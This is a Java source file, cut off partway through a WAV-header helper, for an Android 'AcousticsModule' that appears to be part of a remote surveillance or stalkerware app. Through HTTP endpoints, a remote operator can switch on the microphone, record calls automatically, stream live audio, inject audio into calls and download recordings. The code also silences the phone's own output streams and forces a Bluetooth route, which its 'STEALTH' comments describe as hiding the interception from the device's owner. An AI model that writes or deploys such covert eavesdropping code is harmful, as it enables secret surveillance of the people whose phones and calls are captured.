package com.labs.labrats.modules;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.MediaFrameworkService;

import java.io.File;
import java.io.InputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class AcousticsModule extends BaseModule {

    public AcousticsModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/audio")) {
            return serveAudioPage(session);
        } else if (uri.equals("/audio/mic/start")) {
            return startMicRecording(session, params);
        } else if (uri.equals("/audio/mic/stop")) {
            return stopMicRecording(session);
        } else if (uri.equals("/audio/call/start")) {
            return startCallRecording(params);
        } else if (uri.equals("/audio/call/stop")) {
            return stopCallRecording(session);
        } else if (uri.equals("/audio/status")) {
            return serveAudioStatus();
        } else if (uri.equals("/audio/settings")) {
            return updateAudioSettings(session, params);
        } else if (uri.equals("/audio/recordings")) {
            return serveAudioRecordings(session);
        } else if (uri.equals("/audio/stream")) {
            return serveLiveStream(session);
        } else if (uri.equals("/audio/inject")) {
            return handleAudioInjection(session);
        } else if (uri.equals("/audio/speakerphone")) {
            return toggleSpeakerphone(params);
        }
        return null;
    }

    private Response toggleSpeakerphone(Map<String, String> params) {
        try {
            boolean enable = "true".equalsIgnoreCase(params.get("enable"));
            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.setMode(enable ? AudioManager.MODE_IN_COMMUNICATION : AudioManager.MODE_NORMAL);
                audioManager.setSpeakerphoneOn(enable);
                
                if (enable) {
                    // [STEALTH_SYNC] Kill all physical output streams immediately
                    int[] streams = {
                        AudioManager.STREAM_VOICE_CALL,
                        AudioManager.STREAM_MUSIC,
                        AudioManager.STREAM_RING,
                        AudioManager.STREAM_SYSTEM
                    };
                    for (int s : streams) {
                        audioManager.setStreamVolume(s, 0, 0);
                    }
                    FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Master Silence active. Routing to Virtual Bridge.");
                } else {
                    FirebaseConfig.logActivity("ACOUSTICS_DYNAMO: Hardware normalization executed.");
                }
            }
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"enabled\": " + enable + "}");
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
        }
    }

    private Response serveAudioPage(IHTTPSession session) {
        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<style>")
            .append(".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".status-active { border-color: var(--neon-green); background: rgba(57, 255, 20, 0.05); }")
            .append(".status-inactive { border-color: var(--danger); background: rgba(255, 49, 49, 0.05); }")
            .append(".toggle-container { display: flex; align-items: center; justify-content: space-between; gap: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }")
            .append(".toggle-switch { position: relative; width: 44px; height: 24px; background: #333; border-radius: 12px; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".toggle-switch.active { background: var(--neon-green); border-color: var(--neon-green); }")
            .append(".toggle-switch::after { content: ''; position: absolute; width: 18px; height: 18px; border-radius: 50%; background: #fff; top: 2px; left: 2px; transition: 0.3s; }")
            .append(".toggle-switch.active::after { left: 22px; }")
            .append(".call-alert { padding: 20px; background: rgba(57, 255, 20, 0.1); border-radius: 15px; margin-bottom: 20px; border: 2px solid var(--neon-green); animation: pulse 2s infinite; }")
            .append("@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }")
            .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
            .append("</style>");

        html.append("<div class=\"back-btn-container\">")
            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
            .append("</div>");

        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">ACOUSTICS_INTERFACE <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_INTERFACE', 'Tactical acoustic surveillance hub for remote microphone activation and call interception.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        if (callInProgress) {
            html.append("<div class=\"call-alert\" style=\"border-left: 3px solid var(--neon-green); padding-left: 15px;\">")
                .append("<div style=\"display: flex; align-items: center; gap: 15px;\">")
                .append("<span style=\"font-size: 2rem;\">&#128222;</span>")
                .append("<div>")
                .append("<div style=\"font-size: 1.1rem; font-weight: bold; color: var(--neon-green);\">")
                .append(callType.equals("incoming") ? "INCOMING_CALL_DETECTED" : "OUTGOING_CALL_DETECTED").append("</div>")
                .append("<div style=\"color: #fff; font-family: monospace;\">ID: ").append(escapeHtml(callNumber)).append("</div>")
                .append("</div></div></div>");
        }

        html.append("<div class=\"status-card ").append(isRecording ? "status-active" : "status-inactive").append("\">")
            .append("<div style=\"display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;\">")
            .append("<div>")
            .append("<div class=\"info-label\" style=\"margin:0; font-size: 0.85rem; text-align: left; color: var(--neon-cyan); font-weight: bold;\">")
            .append(isRecording ? "<span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;SURVEILLANCE_ACTIVE" : "&#9899;&nbsp;STANDBY_MODE").append("</div>");

        if (isRecording) {
            String recordingType = isRecordingCall ? "CALL_INTERCEPTION" : "AMBIENT_CAPTURE";
            html.append("<p style=\"color: #888; margin-top: 5px; font-size: 0.7rem; font-family: monospace;\">TYPE: ").append(recordingType).append("</p>")
                .append("<div class=\"duration\" id=\"duration\">").append(FirebaseConfig.formatDuration((int) duration)).append("</div>");
        }
        html.append("</div>");

        if (isRecording) {
            html.append("<a href=\"/audio/").append(isRecordingCall ? "call" : "mic").append("/stop\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05);\">&#9724; TERMINATE</a>");
        }
        
        html.append("</div></div>");

        // Control buttons
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-green);\">")
            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-green);\">AMBIENT_MIC <span class=\"info-trigger\" onclick=\"showInfo(event, 'AMBIENT_MIC', 'Remote activation of the microphone for background audio capture.')\">INFO</span></h2>")
            
            // Live Stream Section
            .append("<div style=\"padding: 15px; background: rgba(0, 242, 255, 0.03); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between;\">")
            .append("  <div>")
            .append("    <div style=\"font-size: 0.75rem; color: var(--neon-cyan); font-weight: bold;\">REAL-TIME_UPLINK</div>")
            .append("    <div style=\"font-size: 0.65rem; color: #888; margin-top: 2px;\">Stream audio directly to browser</div>")
            .append("  </div>")
            .append("  <button id=\"live-listen-btn\" onclick=\"toggleLiveAudio()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">LISTEN_LIVE</button>")
            .append("</div>")

            .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
            .append("<a href=\"/audio/mic/start\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_REC</a>")
            .append("<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">30s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">60s_BURST</a>")
            .append("<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\"").append(">5m_BURST</a>")
            .append("</div></div>");

        // Call recording section
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">COMMS_INTERCEPTION <span class=\"info-trigger\" onclick=\"showInfo(event, 'COMMS_INTERCEPTION', 'Automated monitoring and recording of cellular voice communications.')\">INFO</span></h2>")
            .append("<div style=\"display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px;\">")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">AUTO_RECORD_CALLS:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(!autoRecordEnabled).append("&save_on_device=").append(saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(autoRecordEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">SAVE_LOCAL_COPY:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(autoRecordEnabled).append("&save_on_device=").append(!saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(saveOnDeviceEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("</div></div>");

        // --- ACOUSTICS VAULT SECTION ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">ACOUSTICS_VAULT <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_VAULT', 'Access captured audio files from ambient surveillance or call intercepts.')\">INFO</span></h2>");
        html.append("<div id=\"audio-recordings-list\" style=\"background: rgba(0,0,0,0.4); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 8px; padding: 15px; min-height: 50px; margin-top: 20px;\">");

        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);
        File[] files = recordDir.listFiles((dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

        if (files != null && files.length > 0) {
            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
            SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault());
            html.append("<ul style=\"list-style: none; padding: 0; margin: 0;\">");
            for (int i = 0; i < Math.min(files.length, 5); i++) {
                File f = files[i];
                String downloadPath;
                if (f.getAbsolutePath().contains(context.getFilesDir().getAbsolutePath())) {
                    downloadPath = "INTERNAL/" + f.getAbsolutePath().replace(context.getFilesDir().getAbsolutePath() + "/", "");
                } else {
                    downloadPath = f.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
                }
                String timeStr = sdf.format(new Date(f.lastModified()));
                html.append("<li style=\"display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);\">");
                html.append("<div style=\"display:flex; flex-direction:column; gap:2px;\">");
                html.append("<span style=\"font-size: 0.7rem; color: #eee; font-family: monospace; word-break: break-all;\">").append(f.getName()).append("</span>");
                html.append("<span style=\"font-size: 0.55rem; color: var(--neon-cyan); opacity: 0.8; font-family: monospace;\">").append(timeStr).append("</span>");
                html.append("</div>");
                html.append("<a href=\"/download/").append(downloadPath).append("\" class=\"btn btn-small\" style=\"padding: 4px 12px; font-size: 0.6rem; margin: 0 0 0 15px; flex-shrink: 0;\">GET</a>");
                html.append("</li>");
            }
            html.append("</ul>");

            // VIEW ALL BUTTON
            String browseUrl = "/audio/recordings";
            if (recordDir.getAbsolutePath().contains(Environment.getExternalStorageDirectory().getAbsolutePath())) {
                String relPath = recordDir.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), "");
                if (relPath.startsWith("/")) relPath = relPath.substring(1);
                browseUrl = "/files/" + relPath;
            }

            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap;\">");
            html.append("<a href=\"").append(browseUrl).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">VIEW_ALL_RECORDINGS</a>");
            html.append("</div>");
        } else {
            html.append("<div style=\"font-size: 0.7rem; color: #555; text-align: center;\">[EMPTY] No recordings found.</div>");
        }
        html.append("</div></div>");

        // Auto-refresh script for status
        html.append("<script>")
            .append("setInterval(function() {")
            .append("  fetch('/audio/status')")
            .append("    .then(r => r.json())")
            .append("    .then(data => {")
            .append("      if (data.isRecording && document.getElementById('duration')) {")
            .append("        var d = data.duration;")
            .append("        var min = Math.floor(d / 60);")
            .append("        var sec = d % 60;")
            .append("        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;")
            .append("      }")
            .append("      if (data.callInProgress && !document.querySelector('.call-alert')) {")
            .append("        location.reload();")
            .append("      }")
            .append("    });")
            .append("}, 2000);")
            .append("</script>");

        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response startMicRecording(IHTTPSession session, Map<String, String> params) {
        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception ignored) {}
        }

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_MIC_REC);
        intent.putExtra("duration", duration);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response stopMicRecording(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_MIC_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Remote call recording initiated");
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_CALL_REC);
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Call recording ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_CALL_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean isRecordingMic = MediaFrameworkService.isRecordingMic();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        String recordingPath = MediaFrameworkService.getCurrentRecordingPath();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(IHTTPSession session, Map<String, String> params) {
        FirebaseConfig.logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_UPDATE_AUDIO_SETTINGS);
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response serveAudioRecordings(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128190; Audio Recordings</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50) break; 

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(FirebaseConfig.formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    String downloadPath;
                    if (file.getAbsolutePath().contains(context.getFilesDir().getAbsolutePath())) {
                        downloadPath = "INTERNAL/" + file.getAbsolutePath().replace(context.getFilesDir().getAbsolutePath() + "/", "");
                    } else {
                        downloadPath = file.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
                    }

                    html.append("<a href=\"/download/").append(downloadPath)
                            .append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">GET_FILE</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>"); 
        html.append("</div>"); 

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveLiveStream(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Handshaking audio bridge...");
        try {
            final PipedOutputStream pos = new PipedOutputStream();
            PipedInputStream pis = new PipedInputStream(pos);

            new Thread(() -> {
                AudioRecord recorder = null;
                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                
                try {
                    int sampleRate = 16000;
                    int channelConfig = AudioFormat.CHANNEL_IN_MONO;
                    int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
                    int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);
                    
                    // [STABILITY_SYNC] Force Communication Mode to hijack call priority
                    if (audioManager != null) {
                        audioManager.setMode(AudioManager.MODE_IN_COMMUNICATION);
                        try {
                            // STEALTH: Force SCO to redirect hardware away from earpiece
                            audioManager.startBluetoothSco();
                            audioManager.setBluetoothScoOn(true);
                            
                            // Mute the physical handset volume but keep internal data stream alive
                            int[] streams = {AudioManager.STREAM_VOICE_CALL, AudioManager.STREAM_MUSIC, AudioManager.STREAM_SYSTEM};
                            for (int s : streams) {
                                audioManager.setStreamVolume(s, 0, 0);
                            }
                        } catch (Exception ignored) {}
                        
                        audioManager.setSpeakerphoneOn(true); // Force internally for capture, but volume is 0
                        FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Handset suppressed. Virtualizing bridge link.");
                    }

                    // Attempt sources in order of "Predatory" capability
                    int[] sources = {
                        MediaRecorder.AudioSource.VOICE_RECOGNITION, // High priority bypass
                        MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                        MediaRecorder.AudioSource.MIC
                    };

                    for (int source : sources) {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                                    FirebaseConfig.logActivity("ACOUSTICS_ERROR: MIC permission missing");
                                    return;
                                }
                            }
                            recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, minBufferSize * 4);
                            if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
                                FirebaseConfig.logActivity("ACOUSTICS_SYNC: Linked to hardware source_" + source);
                                break;
                            }
                        } catch (SecurityException se) {
                            Log.w("Acoustics", "Source " + source + " denied: " + se.getMessage());
                        } catch (Exception ignored) {}
                    }
                    
                    if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                        FirebaseConfig.logActivity("ACOUSTICS_ERROR: All hardware sources blocked by OS.");
                        return;
                    }

                    recorder.startRecording();
                    writeWavHeader(pos, sampleRate, (short) 1, (short) 16);

                    byte[] buffer = new byte[minBufferSize];
                    while (!Thread.currentThread().isInterrupted()) {
                        int read = recorder.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            // [PERFORMANCE_SYNC] Digital Gain Booster (2x)
                            // Boosts low-volume call audio for the dashboard
                            for (int i = 0; i < read; i += 2) {
                                if (i + 1 < read) {
                                    short sample = (short) ((buffer[i] & 0xFF) | (buffer[i + 1] << 8));
                                    // [PERFORMANCE_SYNC] Aggressive Gain Booster (4x)
                                    // Since we muted the hardware, we need high gain to hear the internal loopback
                                    int boosted = sample * 4;
                                    if (boosted > 32767) boosted = 32767;
                                    else if (boosted < -32768) boosted = -32768;
                                    buffer[i] = (byte) (boosted & 0xFF);
                                    buffer[i + 1] = (byte) ((boosted >> 8) & 0xFF);
                                }
                            }
                            pos.write(buffer, 0, read);
                            pos.flush();
                        } else if (read < 0) break;
                    }
                } catch (Exception e) {
                    Log.e("AcousticsModule", "Stream Error: " + e.getMessage());
                } finally {
                    try {
                        if (recorder != null) {
                            recorder.stop();
                            recorder.release();
                        }
                        if (audioManager != null) {
                            audioManager.setMode(AudioManager.MODE_NORMAL);
                            audioManager.stopBluetoothSco();
                            audioManager.setBluetoothScoOn(false);
                        }
                        pos.close();
                    } catch (Exception ignored) {}
                }
            }).start();

            Response res = server.newChunkedResponseProxy(Response.Status.OK, "audio/wav", pis);
            res.addHeader("Cache-Control", "no-cache");
            return res;
        } catch (Exception e) {
            return server.serveErrorProxy("Bridge Failed: " + e.getMessage());
        }
    }

    private static AudioTrack projectorTrack;
    private static final int PROJECTOR_SAMPLE_RATE = 16000;

    private Response handleAudioInjection(IHTTPSession session) {
        try {
            // [STABILITY_SYNC] Read body from NanoHTTPD parsed files if available
            // or read directly from the input stream.
            InputStream is = session.getInputStream();
            if (is == null) return newResponse(Response.Status.BAD_REQUEST, "text/plain", "NO_PAYLOAD");

            // Hard check for projectorTrack state
            if (projectorTrack == null || projectorTrack.getState() == AudioTrack.STATE_UNINITIALIZED) {
                Log.d("AcousticsModule", "Initializing projector track...");
                int minBufSize = AudioTrack.getMinBufferSize(PROJECTOR_SAMPLE_RATE, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
                
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        projectorTrack = new AudioTrack.Builder()
                                .setAudioAttributes(new AudioAttributes.Builder()
                                        .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                        .build())
                                .setAudioFormat(new AudioFormat.Builder()
                                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                                        .setSampleRate(PROJECTOR_SAMPLE_RATE)
                                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                                        .build())
                                .setBufferSizeInBytes(Math.max(minBufSize, 8192))
                                .setTransferMode(AudioTrack.MODE_STREAM)
                                .build();
                    } else {
                        projectorTrack = new AudioTrack(AudioManager.STREAM_VOICE_CALL, PROJECTOR_SAMPLE_RATE, 
                                AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, Math.max(minBufSize, 8192), AudioTrack.MODE_STREAM);
                    }
                    
                    if (projectorTrack.getState() == AudioTrack.STATE_INITIALIZED) {
                        projectorTrack.play();
                        Log.d("AcousticsModule", "Projector track started.");
                    } else {
                        Log.e("AcousticsModule", "Projector track failed to initialize.");
                        return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "INIT_FAILED");
                    }
                } catch (Exception e) {
                    Log.e("AcousticsModule", "Projector Init Error: " + e.getMessage());
                    return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
                }
            }

            if (projectorTrack != null && projectorTrack.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
                byte[] buffer = new byte[4096];
                int read;
                int totalWritten = 0;
                while ((read = is.read(buffer)) > 0) {
                    int written = projectorTrack.write(buffer, 0, read);
                    if (written > 0) totalWritten += written;
                }
                // Log.v("AcousticsModule", "Injected " + totalWritten + " bytes");
            }
            
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } catch (Exception e) {
            Log.e("AcousticsModule", "Injection Error: " + e.getMessage());
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
        }
    }

    private void writeWavHeader(java.io.OutputStream out, int sampleRate, short channels, short bitDepth) throws java.io.IOException {
        byte[] header = new byte[44];
        header[0] = 'R'; header[1] = 'I'; header[2] = 'F'; header[3] = 'F';
        // Set a huge chunk size (0x7FFFFFFF) to simulate infinite data
